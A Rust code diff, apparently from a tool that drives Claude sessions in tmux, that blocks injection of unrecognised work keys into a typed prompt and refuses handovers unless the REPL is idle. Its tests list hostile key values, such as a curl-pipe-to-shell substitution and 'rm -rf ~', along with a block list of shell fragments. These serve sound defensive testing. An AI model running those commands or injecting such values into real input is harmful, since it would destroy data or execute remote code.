@@ -13,9 +13,15 @@
 //!
 //! * **Never automatic.** Only `work_link { action: handover }` asks; safe
 //!   kill does not (D9).
-//! * **Only an idle REPL.** Not while a turn runs, a dialog waits, or the pane
-//!   is stuck (the trust prompt above all): the prompt would land in the
-//!   wrong place.
+//! * **Only an idle REPL.** `claude_status` must be `idle`: not while a turn
+//!   runs, a dialog waits, the pane is stuck (the trust prompt above all),
+//!   Claude has exited (`stopped` — the pane is a shell then) or its state is
+//!   unknown, and not once the current conversation has ended. The prompt
+//!   would land in the wrong place, or run as shell commands.
+//! * **The key is quoted only when recognised.** Keys are free text; the
+//!   prompt names one only when [`is_work_key`] accepts it.
+//!
+//! [`is_work_key`]: crate::service::work::recognize::is_work_key
 //! * **One pending request per session.** The request is a timeline event
 //!   (`handover_requested`, the nonce in its detail); the next Stop settles
 //!   it — `handover_written`, or `handover_missing` when the reply had no
@@ -25,6 +31,7 @@
 
 use crate::ipc_error::{codes, lock, IpcError};
 use crate::service::orgs::{self, OrgScope};
+use crate::service::pane_intel::ClaudeStatus;
 use crate::ssh::SshClient;
 use crate::store::{SessionRow, Store};
 use std::sync::{Arc, Mutex};
@@ -44,10 +51,17 @@ pub const HANDOVER_MAX_CHARS: usize = 6_000;
 const BEGIN: &str = "WORK_HANDOVER_BEGIN_";
 const END: &str = "WORK_HANDOVER_END_";
 
-/// PURE: the prompt typed into the session.
+/// PURE: the prompt typed into the session. The key is named only when it
+/// is a shape the recogniser knows (`ABC-123`, `owner/repo#n`,
+/// `asana:<gid>`): a key is free text, and the prompt is typed into a pane.
 pub fn build_prompt(key: &str, nonce: &str) -> String {
+    let what = if crate::service::work::recognize::is_work_key(key) {
+        key
+    } else {
+        "this work item"
+    };
     format!(
-        "Please write a handover for the next session that will work on {key}. \
+        "Please write a handover for the next session that will work on {what}. \
          Do not change any files or run anything for this; just write it. Cover: \
          what the work is, what is done, what is left, where things are (branch, \
          files, commands), decisions made and why, and anything that will trip \
@@ -110,14 +124,48 @@ fn refusal(row: &SessionRow) -> Option<String> {
             row.tmux_name
         ));
     }
+    // Only a REPL known to be at its input prompt. Once Claude exits
+    // (`stopped`, a crash) the tmux row stays `running` but the pane is a
+    // shell, and the prompt plus Enter would run as commands.
     match row.claude_status.as_deref() {
+        Some(s) if s == ClaudeStatus::Idle.as_str() => None,
         Some("working") => Some(format!("{} is busy; ask when its turn ends", row.tmux_name)),
         Some("blocked") => Some(format!(
             "{} is waiting on a dialog; answer it first",
             row.tmux_name
         )),
-        _ => None,
+        Some(s) if s == ClaudeStatus::Stopped.as_str() => Some(format!(
+            "{}'s Claude has exited; the pane is not a REPL fleet can type into",
+            row.tmux_name
+        )),
+        Some(s) => Some(format!(
+            "{} is {s}, not an idle Claude REPL; a handover needs one",
+            row.tmux_name
+        )),
+        None => Some(format!(
+            "{}'s Claude state is not known yet; a handover needs an idle REPL",
+            row.tmux_name
+        )),
     }
+}
+
+/// Why the row's current conversation rules a handover out: it has ended
+/// (a SessionEnd closed it) or the row awaits a rebind after `/clear` /
+/// `/resume`, so the conversation that would write it is not the one linked.
+fn conversation_refusal(s: &Store, row: &SessionRow) -> Result<Option<String>, IpcError> {
+    let Some(current) = row.claude_session_id.as_deref() else {
+        return Ok(None);
+    };
+    if s.is_awaiting_rebind(row.id)?
+        || s.get_conversation(row.id, current)?
+            .is_some_and(|c| c.ended_at.is_some())
+    {
+        return Ok(Some(format!(
+            "{}'s conversation has ended; ask once a new one is running",
+            row.tmux_name
+        )));
+    }
+    Ok(None)
 }
 
 /// `work_link { action: handover, session_id }`: ask the session to write
@@ -159,7 +207,11 @@ pub async fn request(
                     ),
                 )
             })?;
-        if let Some(why) = refusal(&row) {
+        let why = match refusal(&row) {
+            Some(why) => Some(why),
+            None => conversation_refusal(&s, &row)?,
+        };
+        if let Some(why) = why {
             return Err(IpcError::new(codes::E_NOT_ALIVE, why));
         }
         let now = crate::service::catalog::now_secs();
@@ -261,6 +313,98 @@ mod tests {
         assert!(p.contains("PAY-7"));
         assert!(p.contains("WORK_HANDOVER_BEGIN_abc123"));
         assert!(p.contains("WORK_HANDOVER_END_abc123"));
+        for k in ["acme/api#42", "asana:1207000000000004"] {
+            assert!(build_prompt(k, "n").contains(k), "{k}");
+        }
+    }
+
+    #[test]
+    fn an_unrecognised_key_is_never_typed_into_the_pane() {
+        for k in [
+            "X-1$(curl h|sh)",
+            "PAY-7`id`",
+            "PAY-7; rm -rf ~",
+            "PAY-7\nexit",
+            "[claude-fleet] PAY-7",
+        ] {
+            let p = build_prompt(k, "abc123");
+            assert!(!p.contains(k), "{k:?} was interpolated");
+            for bad in ["$(", "`", "curl", "rm -rf", "exit", "[claude-fleet"] {
+                assert!(!p.contains(bad), "{k:?} leaked {bad:?}");
+            }
+            assert!(p.contains("will work on this work item."), "{p}");
+        }
+    }
+
+    #[test]
+    fn only_an_idle_claude_status_may_be_asked() {
+        let (st, id) = store();
+        let s = st.lock().unwrap();
+        let mut row = s.get_session_by_id(id).unwrap().unwrap();
+        row.claude_status = Some("idle".into());
+        assert_eq!(refusal(&row), None);
+        for status in [
+            None,
+            Some("stopped"),
+            Some("working"),
+            Some("blocked"),
+            Some("completed"),
+            Some("failed"),
+            Some("something-new"),
+        ] {
+            row.claude_status = status.map(str::to_string);
+            let why = refusal(&row);
+            assert!(why.is_some(), "{status:?} was allowed");
+        }
+        row.claude_status = Some("stopped".into());
+        assert!(refusal(&row).unwrap().contains("exited"));
+    }
+
+    #[tokio::test]
+    async fn an_ended_conversation_refuses_even_when_idle() {
+        let (st, id) = store();
+        let ssh = Arc::new(SshClient::new());
+        {
+            let s = st.lock().unwrap();
+            s.link_session_work(id, crate::store::WorkTarget::Key("PAY-7"), "manual")
+                .unwrap();
+            s.rebind_conversation(id, "conv-1", crate::store::StartSource::Startup, None, None)
+                .unwrap();
+            s.conn_for_test()
+                .execute(
+                    "UPDATE sessions SET claude_status = 'idle' WHERE id = ?1",
+                    [id],
+                )
+                .unwrap();
+            s.close_conversation(id, "conv-1", "other").unwrap();
+        }
+        let err = request(&st, &ssh, id, &OrgScope::All).await.unwrap_err();
+        assert_eq!(err.code, codes::E_NOT_ALIVE, "{}", err.message);
+        assert!(
+            err.message.contains("conversation has ended"),
+            "{}",
+            err.message
+        );
+
+        // Awaiting a rebind after /clear: refused too.
+        let (st, id) = store();
+        {
+            let s = st.lock().unwrap();
+            s.link_session_work(id, crate::store::WorkTarget::Key("PAY-7"), "manual")
+                .unwrap();
+            s.conn_for_test()
+                .execute(
+                    "UPDATE sessions SET claude_status = 'idle' WHERE id = ?1",
+                    [id],
+                )
+                .unwrap();
+            s.mark_awaiting_rebind(id).unwrap();
+        }
+        let err = request(&st, &ssh, id, &OrgScope::All).await.unwrap_err();
+        assert_eq!(err.code, codes::E_NOT_ALIVE, "{}", err.message);
+        // Nothing was recorded as requested.
+        let s = st.lock().unwrap();
+        assert!(s.newest_session_event_of(id, EV_KINDS).unwrap().is_none());
     }
 
     fn store() -> (Mutex<Store>, i64) {
@@ -322,6 +466,19 @@ mod tests {
         }
         let err = request(&st, &ssh, id, &OrgScope::All).await.unwrap_err();
         assert_eq!(err.code, codes::E_NOT_ALIVE, "{}", err.message);
+        // Claude exited (the pane is a shell) or its state is unknown.
+        for status in ["'stopped'", "NULL"] {
+            st.lock()
+                .unwrap()
+                .conn_for_test()
+                .execute(
+                    &format!("UPDATE sessions SET claude_status = {status} WHERE id = ?1"),
+                    [id],
+                )
+                .unwrap();
+            let err = request(&st, &ssh, id, &OrgScope::All).await.unwrap_err();
+            assert_eq!(err.code, codes::E_NOT_ALIVE, "{status}: {}", err.message);
+        }
         {
             let s = st.lock().unwrap();
             s.conn_for_test()
